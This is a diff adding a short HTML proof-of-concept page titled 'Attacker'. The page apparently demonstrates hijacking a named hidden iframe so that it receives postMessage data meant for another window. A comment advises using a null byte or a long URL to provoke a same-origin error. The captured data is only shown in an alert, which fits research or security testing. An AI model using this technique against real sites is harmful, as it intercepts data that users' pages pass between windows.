@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Attacker</title>
+</head>
+<body>
+  <iframe id="hijack" name="PREDICTABLE_NAME" style="display:none" src="https://google.com"></iframe>
+  <!-- src need to be same origin use %00 or long url to trigger error known server misconfig -->
+  <button onclick="trigger()">Start Attack</button>
+
+  <script>
+    function trigger() {
+      window.open("/window.html", "_blank");
+
+      // Hijack iframe content (simulate a new origin with message listener)
+      const hijack = document.getElementById("hijack");
+	
+      hijack.onload = () => {
+        hijack.onload = null;
+        hijack.srcdoc = `
+          <script>
+			addEventListener("message", (e)=>{
+				alert("data " + e.data);
+			});
+          <\/script>`;
+      };
+    }
+  </script>
+</body>
+</html>
